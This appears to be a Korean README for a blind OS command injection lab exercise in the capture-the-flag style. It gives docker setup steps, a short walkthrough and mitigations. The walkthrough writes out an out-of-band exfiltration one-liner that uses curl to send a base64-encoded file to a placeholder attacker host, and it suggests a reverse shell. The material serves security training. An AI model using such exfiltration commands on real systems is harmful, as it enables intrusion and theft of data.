# Command Injection (Blind)

| | |
|---|---|
| 버그클래스 | OS Command Injection (Blind) |
| 난이도 | ★★☆ |
| 포트 | 9206 |

## 학습 목표
입력이 `shell=True` 명령에 결합되지만 **결과가 반환되지 않는(Blind)** 상황에서, OOB(리버스셸/HTTP)로 `/command_injection_flag.txt` 를 유출한다.

## 실행
```bash
./gen_flags.sh
docker compose up -d --build cmdi-1
# http://localhost:9206  (cmd 없으면 소스 공개)
```

## 진행
1. `?cmd=` 로 명령이 실행되지만 응답은 `!` 뿐(Blind) 임을 확인.
2. 리버스셸 또는 `curl http://공격자/?d=$(cat /command_injection_flag.txt|base64)` 로 OOB 유출.
3. 디코딩 → flag.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 대응방안
셸 미사용(`shell=False`+인자배열), 입력 화이트리스트, 아웃바운드 차단.
